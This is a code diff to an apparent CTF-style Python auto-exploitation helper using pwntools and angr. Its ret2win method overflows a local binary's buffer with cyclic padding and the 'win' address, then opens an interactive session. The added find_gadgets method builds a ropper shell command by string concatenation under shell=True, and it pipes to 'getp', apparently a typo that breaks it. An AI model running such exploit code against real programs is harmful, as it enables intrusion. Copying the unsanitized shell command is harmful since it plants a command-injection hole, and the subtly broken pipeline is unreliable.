@@ -1,5 +1,6 @@
 from pwn import *
 import angr, claripy
+import subprocess
 
 class ROP:
     def __init__(self, filename, properties):
@@ -8,13 +9,13 @@ class ROP:
         self.offset = Get2overflow(filename).buf()
         self.e = ELF(filename)
         self.p = process(filename)
+        self.gadgets = []
 
     def ret2win(self):
         payload = cyclic(self.offset)
         payload += p64(self.e.sym["win"])
         self.p.sendline(payload)
         self.p.interactive()
-
 
     def ret2execve(self):
         pass
@@ -24,6 +25,12 @@ class ROP:
 
     def supporting_functions_here(self):
         print("example support function")
+
+    def find_gadgets(self):
+        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | getp 0x"
+        raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
+            self.gadgets.append(i.replace(" nop;", ""))
 
 class Get2overflow:
     def __init__(s, binary):
